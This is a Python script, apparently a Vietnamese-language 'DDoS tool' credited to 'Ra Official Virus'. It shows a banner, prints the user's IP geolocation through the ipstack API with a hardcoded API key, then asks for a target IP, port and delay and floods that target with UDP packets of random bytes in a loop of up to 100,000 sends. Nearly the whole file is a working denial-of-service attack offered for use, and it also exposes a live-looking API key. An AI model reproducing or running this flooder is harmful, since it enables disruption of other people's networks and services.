import socket
import random
import time
import colorama
from colorama import Fore, Style
from threading import Thread
from bs4 import BeautifulSoup
from socket import socket, AF_INET, SOCK_DGRAM
import os
from threading import Thread
from random import choices, randint
import requests
from pystyle import *
import socket
from getpass import getpass as hinput
def get_ip_info(ip_addr, api_key):
    url = f"http://api.ipstack.com/{ip_addr}?access_key={api_key}"
    response = requests.get(url)
    data = response.json()
    return data
import datetime





os.system("cls" if os.name == "nt" else "clear")
blue = Col.light_blue
lblue = Colors.StaticMIX((Col.light_green, Col.white, Col.white))
red = Colors.StaticMIX((Col.green, Col.white, Col.white))
def format_print1(text):
    return f"""                       {lblue}{text}{Col.reset}"""

def format_input1(text):
    return f"""                       {lblue}{text}{Col.reset}"""
def format_print(symbol, text):
    return f"""                      {Col.Symbol(symbol, lblue, blue)} {lblue}{text}{Col.reset}"""

def format_input(symbol, text):
    return f"""                      {Col.Symbol(symbol, red, blue)} {red}{text}{Col.reset}"""

banner = r"""
                        Tool Ddos Mod By
            Ra Official Virus - Thạch Mô Ra - Khanh Lâm
    Thoại Killua Minh Thuận - Quaw Baw - Lai Plus - Tr Văn Tý""".replace('▓', '▀')
fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white

blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
purple = Col.StaticMIX((Col.purple, blue, Col.white))

fluo = Col.light_green
fluo2 = Col.light_blue
white = Col.yellow

blue = Col.light_blue
lblue = Colors.StaticMIX((Col.light_green, Col.white, Col.white))
red = Colors.StaticMIX((Col.green, Col.white, Col.white))
Anime.Fade(Center.Center(banner), Colors.blue_to_green, Colorate.Vertical, enter=True)
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ascii = r'''
┌────────────────────────────────────────────────────────────────┐
│                                                                │
│             ██╗   ██╗██╗██████╗ ██╗   ██╗███████╗              │
│             ██║   ██║██║██╔══██╗██║   ██║██╔════╝              │
│             ██║   ██║██║██████╔╝██║   ██║███████╗              │
│             ╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║              │
│              ╚████╔╝ ██║██║  ██║╚██████╔╝███████║              │
│               ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝              │
│                                 Tool By: Ra Official Virus     │
└────────────────────────────────────────────────────────────────┘
  '''
print(Colorate.Vertical(Colors.DynamicMIX((Col.red, Col.blue)), Center.XCenter(ascii.center(100))))
def check():
    ip_address = requests.get('https://api.ipify.org').text
    YOUR_API_KEY = "f8f7016e2d0d474c6f68ad42ce4db926"
    ip_info = get_ip_info(ip_address, YOUR_API_KEY)
    print(f"\033[32m╔═══════════════════════════════════════════════════════╗")
    print(f"\033[32m║\033[34mĐịa Chỉ IP:\033[32m {ip_address}")
    print(f"\033[32m║\033[34mKinh Độ:\033[32m {ip_info['longitude']}")
    print(f"\033[32m║\033[34mVĩ Độ:\033[32m {ip_info['latitude']}")
    print(f"\033[32m║\033[34mKhu Vực:\033[32m {ip_info['region_name']}")
    print(f"\033[32m║\033[34mQuốc Gia:\033[32m {ip_info['country_name']}")
    print(f"\033[32m║\033[34mThành Phố:\033[32m {ip_info['city']}")
    print(f"\033[32m║\033[34mMã Vùng:\033[32m {ip_info['zip']}")
    print(f"\033[32m╚═══════════════════════════════════════════════════════╝")
now = datetime.datetime.now()
formatted_date = now.strftime("%d/%m/%Y %H:%M:%S")
check()  


ip = input(" > Nhập IP Cần Ddos Vào Đây :\033[33m ")
port = int(input("\033[32m > Nhập Port Cần Ddos :\033[33m "))
sleep = float(input("\033[32m > Tốc Độ Ddos Là:\033[33m "))
s.connect((ip, port))

for i in range(1, 100 * 1000):
  s.send(random._urandom(10) * 1000)
  print(f"\033[31m > Số Lần Ddos Wifi Là:\033[32m {i}", end='\r')
  time.sleep(sleep)